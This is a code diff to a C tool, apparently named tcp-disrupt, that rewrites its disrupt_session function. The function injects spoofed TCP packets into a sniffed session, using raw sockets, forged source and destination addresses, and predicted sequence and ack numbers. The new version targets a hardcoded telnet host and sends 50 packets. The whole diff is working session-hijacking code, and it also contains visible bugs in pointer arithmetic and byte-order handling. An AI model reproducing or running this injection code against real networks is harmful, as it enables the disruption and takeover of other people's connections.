@@ -76,104 +76,63 @@ void display_usage(char *name) {
  * take place after the connection has been hijacked.
  *
  * Once the function has been hijacked, and the desired actions have been taken on the hijacked session, this function should exit tcp-disrupt. 
- *
- * @param serverIP          String representation of the source's IP address.
- * @param serverPort        The port used by the source in the TCP session being hijacked.
- * @param clientIP     String representation of the destination's IP address.
- * @param clientPort   The port used by the destination in the TCP session being hijacked.
- * @param sequenceNumber    The sequence number to be acknowledged by the desination.
- * @param ackNumber         The last sequence number acknowledged by the source.
  */
-void disrupt_session(char *serverIP, uint16_t serverPort, char *clientIP, uint16_t clientPort, uint32_t sequenceNumber, uint32_t ackNumber, int timestamp, int finalRound) {
-    static char packet[ sizeof(struct tcphdr) + sizeof(struct iphdr) + 2 ];
+void disrupt_session(void *sniffedPacket) {
     
-    // Socket FD
-    int sock, one = 1;
-
-    // Amounts to increase ack and seq by
-    uint32_t ack_inc, seq_inc;
-
-    //Address struct to sendto()
+    struct ip *ipHeader         = (struct ip *)sniffedPacket;
+    struct tcphdr *tcpHeader    = (struct tcphdr *)(ipHeader + (4 * ipHeader->ip_hl));
     struct sockaddr_in addr_in;
-
-    // Initialize static values if they have never been set
-    ack_inc = 1;
-    seq_inc = 1;
-
-    printf("[disrupt_session]: New Sequence Number: %u\n", sequenceNumber + seq_inc);
-    printf("[disrupt_session]: New ACK: %u\n\n", ackNumber + ack_inc);
+    addr_in.sin_family          = AF_INET;
+    addr_in.sin_port            = ntohs(23); //tcpHeader->source);
+    addr_in.sin_addr.s_addr     = inet_addr("192.168.1.112");   //inet_ntoa(ipHeader->ip_src));
+    int sizeOfPacket            = sizeof(struct tcphdr) + sizeof(struct iphdr) + 2;
+    void *packet                = malloc(sizeOfPacket);
+    uint32_t ack_inc            = 1;       // Amount to increase ack by
+    uint32_t seq_inc            = 1;       // Amount to increase seq by
+    int sock                    = -1;       // Socket FD
+    int one                     = 1;        // ??????????????
 
     //Raw socket without any protocol-header inside
     if((sock = socket(PF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
         perror("Error while creating socket\n");
         exit(-1);
     }
-
     //Set option IP_HDRINCL (headers are included in packet)
     if(setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (char *)&one, sizeof(one)) < 0) {
         perror("Error while setting socket options\n");
         exit(-1);
     }
 
-    //Populate address struct
-    addr_in.sin_family = AF_INET;
-    addr_in.sin_port = htons(clientPort);
-    addr_in.sin_addr.s_addr = inet_addr(clientIP);
-
-
-    int z = 50;
-    while(z--){
-        printf("Sending {\"srcIP\":\"%s\", \"dstIP\":\"%s\", \"dstPort\":%d, \"srcPort\":%d, \"SYN\":%d, \"ACK\":%d, \"ACK_NUM\":%u, \"SYN_NUM\":%u, \"RST\":%d, \"data\":\"%s\"}", 
-            clientIP, serverIP, serverPort, clientPort, SYN_OFF, ACK_ON, ackNumber+ack_inc, sequenceNumber+seq_inc, RESET_OFF, "X");
-        fill_packet(serverIP,
-                    clientIP,
-                    clientPort,
-                    serverPort,
-                    SYN_OFF,
-                    ACK_ON,
-                    PSH_ON,
-                    ackNumber + ack_inc,
-                    sequenceNumber + seq_inc,
-                    RESET_OFF,
-                    "X",
-                    packet,
-                    sizeof(struct tcphdr) + sizeof(struct iphdr) + 2 + 12);
-
-        char *nopPtr = packet + sizeof(struct iphdr) + sizeof(struct tcphdr);
-        *nopPtr = 0x01;
-        nopPtr++;
-        *nopPtr = 0x01;
-        nopPtr++;
-        *nopPtr = 0x08;
-        nopPtr++;
-        *nopPtr = 0x0a;
-        nopPtr++;
-        *nopPtr = 0x01;
-        nopPtr++;
-        *nopPtr = 0x01;
-        nopPtr++;
-        *nopPtr = 0x01;
-        nopPtr++;
-        *nopPtr = 0x01;
-        nopPtr++;
-        *nopPtr = 0x01;
-        nopPtr++;
-        *nopPtr = 0x01;
-        nopPtr++;
-        *nopPtr = 0x01;
-        nopPtr++;
-        *nopPtr = 0x01;
-        nopPtr++;
-        *nopPtr = 'Q';
-        nopPtr++;
-        *nopPtr = '\0';
+    int packetCountdown = 50;
+    while(packetCountdown--){
+        printf("Sending {");
+        printf("\"srcIP\":\"%s\", ",    inet_ntoa(ipHeader->ip_src));
+        printf("\"dstIP\":\"%s\", ",    inet_ntoa(ipHeader->ip_dst));
+        printf("\"dstPort\":%d, ",      ntohs(tcpHeader->dest));
+        printf("\"srcPort\":%d, ",      ntohs(tcpHeader->source));
+        printf("\"SYN\":%d, ",          SYN_OFF);
+        printf("\"ACK\":%d, ",          ACK_ON);
+        printf("\"ACK_NUM\":%u, ",      ntohl(tcpHeader->ack_seq) + ack_inc);
+        printf("\"SYN_NUM\":%u, ",      ntohl(tcpHeader->seq) + seq_inc);
+        printf("\"RST\":%d, ",          RESET_OFF);
+        printf("\"data\":\"%s\"",       "X");
+        printf("}");
+        
+        fill_packet(inet_ntoa(ipHeader->ip_dst),            // Source IP Address
+                    inet_ntoa(ipHeader->ip_src),            // Destination IP Address
+                    ntohs(tcpHeader->source),               // Destination Port
+                    ntohs(tcpHeader->dest),                 // Source Port
+                    SYN_OFF,                                // SYN Flag
+                    ACK_ON,                                 // ACK Flag
+                    PSH_ON,                                 // PSH Flag
+                    ntohl(tcpHeader->seq) + ack_inc,        // Sequence Number
+                    ntohl(tcpHeader->ack_seq) + seq_inc,    // Acknowledgement Number
+                    RESET_OFF,                              // RST Flag
+                    "X",                                    // Data
+                    packet,                                 // Packet to fill
+                    sizeOfPacket);                          // Total size of packet
 
         // Send out the packet
-        printf("Sending Packet! Result: %d\n", send_packet(sock, packet, addr_in));
+        printf("Sending Packet %02d of %02d! Result: %d\n", 49-packetCountdown, 50, send_packet(sock, packet, addr_in));
     }
-
-    if(finalRound){
-        exit(0);
-    }
-
 }
